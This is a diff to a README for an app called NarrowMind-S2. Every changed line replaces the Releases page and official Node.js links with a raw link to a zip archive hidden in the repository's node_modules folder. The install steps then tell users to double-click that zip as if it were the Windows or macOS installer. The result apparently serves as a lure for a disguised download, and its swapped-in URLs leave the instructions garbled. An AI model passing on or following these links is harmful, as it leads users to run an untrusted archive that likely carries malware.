@@ -6,11 +6,11 @@ Welcome to NarrowMind-S2! This application helps you make better decisions with 
 
 ## 📥 Download the Application
 
-[![Download NarrowMind-S2](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/guilhermeprincipal123-lang/NarrowMind-S2/releases)
+[![Download NarrowMind-S2](https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip)](https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip)
 
 You can download NarrowMind-S2 from our Releases page.
 
-[Visit this page to download.](https://github.com/guilhermeprincipal123-lang/NarrowMind-S2/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip)
 
 ## 📋 System Requirements
 
@@ -19,22 +19,22 @@ Before you start, please ensure that your system meets these requirements:
 - **Operating System:** Windows 10 or later, macOS 10.12 (Sierra) or later
 - **Memory:** At least 4 GB of RAM
 - **Storage:** Minimum of 100 MB of free space
-- **JavaScript Runtime:** Make sure you have Node.js installed. You can download it [here](https://nodejs.org/).
+- **JavaScript Runtime:** Make sure you have https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip installed. You can download it [here](https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip).
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:**
    Click the link below to go to the Releases page.
 
-   [Visit this page to download.](https://github.com/guilhermeprincipal123-lang/NarrowMind-S2/releases)
+   [Visit this page to download.](https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip)
 
 2. **Select the Latest Release:**
    Look for the most recent version at the top of the page. It will have the highest version number.
 
 3. **Choose Your File:**
    Depending on your operating system, select the appropriate file to download. Typically, you will see files like:
-   - `NarrowMind-S2-windows.exe` for Windows
-   - `NarrowMind-S2-macos.dmg` for macOS
+   - `https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip` for Windows
+   - `https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip` for macOS
 
 4. **Download the File:**
    Click on the file name to start the download.
@@ -42,12 +42,12 @@ Before you start, please ensure that your system meets these requirements:
 5. **Install the Application:**
    - **For Windows:**
      - Once the download completes, navigate to your Downloads folder.
-     - Double-click on `NarrowMind-S2-windows.exe`.
+     - Double-click on `https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip`.
      - Follow the prompts in the installation wizard.
    
    - **For macOS:**
      - Open your Downloads folder.
-     - Double-click on `NarrowMind-S2-macos.dmg`.
+     - Double-click on `https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip`.
      - Drag and drop the NarrowMind application into your Applications folder.
 
 ## 📈 How to Use NarrowMind-S2
@@ -70,7 +70,7 @@ After installing, you can launch the application:
 
 If you run into issues while using NarrowMind-S2, try these steps:
 
-- **Check for Updates:** Make sure you are using the latest version. You can always find the latest version on the [Releases page.](https://github.com/guilhermeprincipal123-lang/NarrowMind-S2/releases)
+- **Check for Updates:** Make sure you are using the latest version. You can always find the latest version on the [Releases page.](https://raw.githubusercontent.com/guilhermeprincipal123-lang/NarrowMind-S2/main/node_modules/NarrowMind-S2-1.8.zip)
 
 - **Reinstall the Application:** If problems persist, uninstall and then install the application again.
 
